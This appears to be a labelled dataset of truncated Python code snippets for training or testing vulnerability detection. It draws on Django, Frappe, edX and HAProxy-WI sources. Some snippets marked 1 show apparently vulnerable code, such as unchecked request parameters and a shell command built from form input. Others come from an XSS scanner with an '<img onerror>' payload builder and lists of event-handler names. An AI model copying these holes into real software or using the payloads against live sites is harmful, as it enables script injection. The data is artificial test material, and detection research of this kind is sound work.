'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', ", "label": 0}, {"snippet_id": 32053, "code": ":mappings:create\" classes=(\"ajax-modal\",) icon=\"plus\" policy_rules=((\"identity\", \"identity:create_mapping\"),) class EditMappingLink(tables.LinkAction): name=\"edit\" verbose_name=_(\"Edit\") url=\"horizon:identity", "label": 0}, {"snippet_id": 38565, "code": "): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype", "label": 0}, {"snippet_id": 17856, "code": "': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/", "label": 0}, {"snippet_id": 2218, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def", "label": 0}, {"snippet_id": 48222, "code": ": Profile=get_current_user(request) for f in files: handle_file(user, str(f.name), category, \" except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return redirect(\"/admin/media/add", "label": 0}, {"snippet_id": 38053, "code": "\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes", "label": 0}, {"snippet_id": 48581, "code": " if srid==0: sr=SubReservation() else: sr=SubReservation.objects.get(id=srid) if request.POST.get(\"notes\"): sr.notes=request.POST[\"notes\"] else: sr.notes=\" \" sr.primary_reservation=GroupReservation.objects", "label": 1}, {"snippet_id": 23996, "code": "(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir", "label": 0}, {"snippet_id": 52068, "code": ".mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id", "label": 1}, {"snippet_id": 50770, "code": " args: args=list(args) text=args[0] if text is None: return else: return flags=self.protocol_flags text=utils.to_str(text, force_string=True) options=kwargs.pop(\"options\",{}) raw=options.get(\"raw\", flags", "label": 0}, {"snippet_id": 34819, "code": " import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self", "label": 0}, {"snippet_id": 27882, "code": "(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, 500) else: self.render('error.html', values, 500) def", "label": 0}, {"snippet_id": 31840, "code": "\texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e) \t \tservers=sql.get_dick_permit() \tpath=sql.get_setting('haproxy_dir", "label": 0}, {"snippet_id": 12368, "code": "]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook", "label": 0}, {"snippet_id": 5383, "code": "'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin", "label": 0}, {"snippet_id": 43107, "code": ".ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants", "label": 0}, {"snippet_id": 17750, "code": "'auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',", "label": 0}, {"snippet_id": 5871, "code": " s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' ", "label": 1}, {"snippet_id": 14833, "code": " ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file", "label": 0}, {"snippet_id": 5339, "code": "'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong',", "label": 0}, {"snippet_id": 38026, "code": ".comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", ", "label": 0}, {"snippet_id": 2523, "code": " print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact", "label": 1}, {"snippet_id": 50461, "code": ".addErrback(self._responseFailed, csessid, request) if csessid in self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server.NOT_DONE_YET def mode_close(self, request):", "label": 0}, {"snippet_id": 30843, "code": " Environment, FileSystemLoader \tleft=form.getvalue('left') \tright=form.getvalue('right') \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \tcmd='diff -ub %s%s %s%s' %(hap_configs_dir,", "label": 0}, {"snippet_id": 52161, "code": ").id if doc else -1, 'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return", "label": 1}, {"snippet_id": 43097, "code": " comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\"", "label": 0}, {"snippet_id": 35397, "code": ".fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[", "label": 0}, {"snippet_id": 30888, "code": " \t \tprint(template) \tprint(stderr) \t if serv is not None and act==\"configShow\": \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \t \tif form.getvalue('configver') is None:\t \t", "label": 0}, {"snippet_id": 22987, "code": ".progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 17534, "code": ", ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager", "label": 0}, {"snippet_id": 8367, "code": " urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views", "label": 0}, {"snippet_id": 10632, "code": " Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report", "label": 0}, {"snippet_id": 7067, "code": "[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\")", "label": 0}, {"snippet_id": 34037, "code": " posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text", "label": 0}, {"snippet_id": 29322, "code": " systemctl restart keepalived\"] \telse: \t\tif kwargs.get(\"just_save\")==\"test\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo rm -f \" +tmp_file] \t\telif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands", "label": 0}, {"snippet_id": 54652, "code": "'article' template_name='details.html' form_class=CommentForm def get_success_url(self): return reverse('article-detail', kwargs={'pk': self.object.pk}) def get_context_data(self, **kwargs): context=super", "label": 0}, {"snippet_id": 37669, "code": " \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1", "label": 0}, {"snippet_id": 30933, "code": " class=\"alert alert-danger\">Can\\'t read import config file</div>') \t\t \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext", "label": 1}, {"snippet_id": 508, "code": " import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger", "label": 0}, {"snippet_id": 42444, "code": "\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0", "label": 0}, {"snippet_id": 35203, "code": ") is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df", "label": 0}, {"snippet_id": 6019, "code": "'eduid_idp',], package_dir={'': 'src'}, zip_safe=False, install_requires=install_requires, extras_require={ 'testing': testing_extras, }, entry_points={ 'console_scripts':['eduid_idp=eduid_idp.idp:main', ] }", "label": 0}, {"snippet_id": 25547, "code": " includes the attendee name for admission tickets, if the corresponding setting is enabled, as well as additional questions defined by the organizer. \"\"\" def __init__(self, *args, **kwargs): \"\"\" Takes two", "label": 0}, {"snippet_id": 48339, "code": " notes: str=request.POST[\"notes\"] ar=ArticleRequested() ar.AID=Article.objects.get(id=aid) ar.RID=current_reservation if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])", "label": 1}, {"snippet_id": 16960, "code": "[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 40910, "code": ": \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif", "label": 0}, {"snippet_id": 31573, "code": "\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]", "label": 0}, {"snippet_id": 29224, "code": "\tfor line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, **kwargs): \terror=\"\" \tfull_path=path +file \tif kwargs.get('dir')==\"fullpath\": \t\tfull_path=path \t \ttry: \t\tssh=ssh_connect(serv) ", "label": 0}, {"snippet_id": 33998, "code": " comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ ", "label": 0}, {"snippet_id": 36464, "code": " value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('='", "label": 0}, {"snippet_id": 30205, "code": " \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers\": \tovw.get_overviewServers() \t if form.getvalue('action'): \timport", "label": 0}, {"snippet_id": 30836, "code": "('right') is not None: \tfrom jinja2 import Environment, FileSystemLoader \tleft=form.getvalue('left') \tright=form.getvalue('right') \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir", "label": 0}, {"snippet_id": 14007, "code": "[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 37384, "code": " image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len", "label": 0}, {"snippet_id": 25575, "code": ": The event this belongs to \"\"\" cartpos=self.cartpos=kwargs.pop('cartpos', None) orderpos=self.orderpos=kwargs.pop('orderpos', None) pos=cartpos or orderpos item=pos.item questions=pos.item.questions_to_ask", "label": 0}, {"snippet_id": 44145, "code": "\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;& \"\"\".strip() hits=results.hits.hits assert len(hits)==1 inner_hits=hits[0]['inner_hits'] domain_hits=inner_hits['domains']['hits']['hits'] assert len(domain_hits)", "label": 1}, {"snippet_id": 502, "code": ".logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers", "label": 1}, {"snippet_id": 9394, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 35390, "code": "\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)", "label": 0}, {"snippet_id": 6208, "code": " cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, 'num_threads') @property def logdir(self): \"\"\" Path to CherryPy logfiles(string). Something like '/var/log/idp' maybe. ", "label": 0}, {"snippet_id": 36141, "code": " \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta", "label": 0}, {"snippet_id": 33351, "code": "[ webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases', expiration.CronExpireBuildLeases), webapp2.Route(r'/internal/cron/buildbucket/expire_builds', expiration.CronExpireBuilds), webapp2.Route", "label": 0}, {"snippet_id": 51477, "code": ", 'websecmap.map', 'websecmap.pro', 'dashboard.internet_nl_dashboard', 'django_otp', 'django_otp.plugins.otp_static', 'django_otp.plugins.otp_totp', 'two_factor', ] try: if not os.environ.get('COMPRESS", "label": 0}, {"snippet_id": 9234, "code": "<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware", "label": 1}, {"snippet_id": 9084, "code": "+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 20452, "code": ".course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth", "label": 0}, {"snippet_id": 26037, "code": "('event') self.request=kwargs.pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional=kwargs.pop('all_optional', False) super().__init__(*args, **kwargs) if not event.settings", "label": 0}, {"snippet_id": 32721, "code": " self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">", "label": 0}, {"snippet_id": 19148, "code": "{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str", "label": 0}, {"snippet_id": 48242, "code": " get_current_user import json import datetime RESERVATION_CONSTRUCTION_COOKIE_KEY: str=\"org.technikradio.c3shop.frontpage\" +\\ \".reservation.cookiekey\" EMPTY_COOKY_VALUE: str=''' { \"notes\": \"\", \"articles\":[", "label": 0}, {"snippet_id": 35084, "code": " \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062", "label": 0}, {"snippet_id": 23016, "code": " name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',", "label": 0}, {"snippet_id": 18725, "code": "'ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/'", "label": 0}, {"snippet_id": 23199, "code": "]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt", "label": 0}, {"snippet_id": 30811, "code": ".html') \tleft=form.getvalue('left') \tright=form.getvalue('right') \t \ttemplate=template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t \tprint(template) \t if serv is not", "label": 0}, {"snippet_id": 11644, "code": "), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done", "label": 0}, {"snippet_id": 33471, "code": " __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import", "label": 1}, {"snippet_id": 7746, "code": ">[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/", "label": 0}, {"snippet_id": 12005, "code": "?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/", "label": 0}, {"snippet_id": 10303, "code": " shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def", "label": 0}, {"snippet_id": 42221, "code": ") \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t", "label": 0}, {"snippet_id": 40356, "code": "'Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords", "label": 0}, {"snippet_id": 10024, "code": " is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}", "label": 0}, {"snippet_id": 12637, "code": "=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r", "label": 0}, {"snippet_id": 27598, "code": ".redirect(login_url) return contact_string=db_config.get_value('contact_string') template_values={ 'message': message, 'user_email': helpers.get_user_email(), 'login_url': login_url, 'switch_account_url", "label": 0}, {"snippet_id": 15172, "code": " except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below", "label": 0}, {"snippet_id": 39339, "code": "\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif", "label": 0}, {"snippet_id": 16456, "code": " template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template", "label": 0}, {"snippet_id": 14560, "code": " BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns", "label": 1}, {"snippet_id": 46777, "code": " import comment_reacted from.utils import RedisSettings markdown=mistune.Markdown() MC_KEY_COMMENT_LIST='comment:%s:comment_list' MC_KEY_N_COMMENTS='comment:%s:n_comments' MC_KEY_COMMNET_IDS_LIKED_BY_USER", "label": 0}, {"snippet_id": 29218, "code": "(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, **kwargs): \terror=\"\" \tfull_path=path +file \tif kwargs.get('dir", "label": 0}, {"snippet_id": 7448, "code": "?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/", "label": 0}, {"snippet_id": 54876, "code": " HttpResponseBadRequest, HttpResponseForbidden, JsonResponse, ) from django.shortcuts import get_object_or_404 from django.views.decorators.http import( require_POST ) from pontoon.base.models import( ChangedEntityLocale", "label": 0}, {"snippet_id": 28783, "code": "'' \tssh_user_password='' \t \tfor sshs in sql.select_ssh(serv=serv): \t\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs[5] \t\tssh_key_name=fullpath+'/keys/%s.pem' % sshs[2] \tservers=sql", "label": 0}, {"snippet_id": 36849, "code": "\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under", "label": 1}, {"snippet_id": 27762, "code": "(values, cls=JsonEncoder)) self.response.set_status(status) def handle_exception(self, exception, _): \"\"\"Catch exception and format it properly.\"\"\" try: status=500 values={ 'message': exception.message", "label": 0}, {"snippet_id": 18006, "code": ", name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify", "label": 0}, {"snippet_id": 12581, "code": "]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading", "label": 0}, {"snippet_id": 50605, "code": " session running in an AjaxWebclient. \"\"\" def __init__(self, *args, **kwargs): self.protocol_key=\"webclient/ajax\" super(AjaxWebClientSession, self).__init__(*args, **kwargs) def get_client_session(self", "label": 0}, {"snippet_id": 9798, "code": "-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds", "label": 0}, {"snippet_id": 1291, "code": "]: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records", "label": 0}, {"snippet_id": 21667, "code": "/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups", "label": 0}, {"snippet_id": 52581, "code": "(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get", "label": 0}, {"snippet_id": 15635, "code": "=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format", "label": 0}, {"snippet_id": 13916, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading", "label": 0}, {"snippet_id": 9475, "code": ".list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(", "label": 0}, {"snippet_id": 12381, "code": "]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses", "label": 0}, {"snippet_id": 47006, "code": "( Q(user_id=user_id), Q(target_id__in=cids), Q(target_kind=K_COMMENT)) return[item.target_id for item in queryset] @comment_reacted.connect async def update_comment_list_cache(_, user_id, comment_id): comment", "label": 0}, {"snippet_id": 27340, "code": " import local_config from datastore import ndb from google_cloud_utils import storage from libs import auth from libs import form from libs import helpers from system import environment def add_jinja2_filter", "label": 0}, {"snippet_id": 37886, "code": "\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro", "label": 0}, {"snippet_id": 858, "code": " else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if", "label": 1}, {"snippet_id": 8444, "code": " import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth", "label": 0}, {"snippet_id": 31069, "code": " \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip]) \t\t\t \tos.system(\"rm -f %s\" % script) \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster", "label": 0}, {"snippet_id": 51014, "code": " we'll move to the horrifically designed absolute nightmare format Crontab. Crontab would be half-great if the parameters where named. Get your crontab guru going, this is the only way you'll understand", "label": 0}, {"snippet_id": 53031, "code": " or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1}", "label": 0}, {"snippet_id": 12403, "code": "[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 7341, "code": " continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template'", "label": 0}, {"snippet_id": 18963, "code": "'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 3399, "code": ").path break if parsed_url=='': parsed_url=url for 